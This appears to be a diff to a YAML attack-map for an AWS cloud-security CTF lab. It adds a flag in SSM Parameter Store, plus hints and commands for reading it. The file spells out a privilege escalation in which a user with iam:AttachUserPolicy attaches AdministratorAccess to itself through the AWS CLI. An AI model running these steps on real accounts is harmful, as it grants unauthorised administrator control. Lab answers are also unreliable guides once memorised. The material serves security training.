@@ -4,7 +4,7 @@ attackMap:
       label: "Starting User"
       type: principal
       subType: iam-user
-      isTarget: true
+      isAdmin: true
       arn: "arn:aws:iam::{account_id}:user/pl-prod-iam-008-to-admin-starting-user"
       access:
         type: assumed-breach-credentials
@@ -18,6 +18,13 @@ attackMap:
         Regardless of how you obtained them, you are now operating as this principal.
         This IAM user has iam:AttachUserPolicy permission on all resources, meaning it
         can attach any managed policy — including AdministratorAccess — to itself.
+
+    - id: ctf-flag
+      label: "CTF Flag"
+      type: resource
+      subType: ssm-parameter
+      isTarget: true
+      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/iam-008-to-admin"
 
   edges:
     - from: starting-principal
@@ -41,3 +48,17 @@ attackMap:
           command: "aws iam attach-user-policy --user-name pl-prod-iam-008-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
         - description: "Verify administrator access by listing IAM users"
           command: "aws iam list-users"
+
+    - from: starting-principal
+      to: ctf-flag
+      label: "Read CTF flag"
+      description: >
+        With AdministratorAccess now attached to the starting user, read the CTF flag from
+        AWS Systems Manager Parameter Store to prove end-to-end account compromise.
+      hints:
+        - "You now have full administrator access. The flag lives in AWS Systems Manager Parameter Store under a predictable path."
+        - "All to-admin scenarios store their flag at /pathfinding-labs/flags/{scenario-id}-to-admin. What is the scenario ID here?"
+        - "Use aws ssm get-parameter with --query 'Parameter.Value' --output text to read the flag value directly."
+      commands:
+        - description: "Read the CTF flag from SSM Parameter Store"
+          command: "aws ssm get-parameter --name /pathfinding-labs/flags/iam-008-to-admin --query 'Parameter.Value' --output text"
